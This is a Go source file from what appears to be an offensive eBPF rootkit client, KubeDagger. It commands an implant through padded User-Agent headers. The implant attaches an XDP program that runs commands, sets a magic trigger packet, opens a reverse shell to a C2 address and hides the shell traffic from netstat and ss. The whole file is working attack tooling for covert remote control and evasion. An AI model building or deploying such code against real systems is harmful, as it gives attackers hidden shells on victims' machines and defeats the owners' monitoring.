package xdp_shell

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type XDPShellResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, connectAddr, protocol, output string) error {
	result := &XDPShellResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"attach_xdp_program",
			"attach XDP program with embedded command executor to network interface",
			"xdp_shell_attach",
		},
		{
			"configure_magic_packet",
			"set magic byte sequence that triggers command extraction from incoming packets",
			"xdp_shell_set_magic",
		},
		{
			"enable_response_injection",
			"configure bpf_xdp_adjust_head for raw packet response construction",
			"xdp_shell_enable_response",
		},
		{
			"connect_reverse_shell",
			"initiate reverse connection via crafted protocol packets to C2 address",
			"xdp_shell_connect",
		},
		{
			"hide_from_netstat",
			"ensure shell traffic is invisible to netstat/ss by processing at XDP layer",
			"xdp_shell_hide",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + connectAddr + "#" + protocol
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/xdp_shell", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
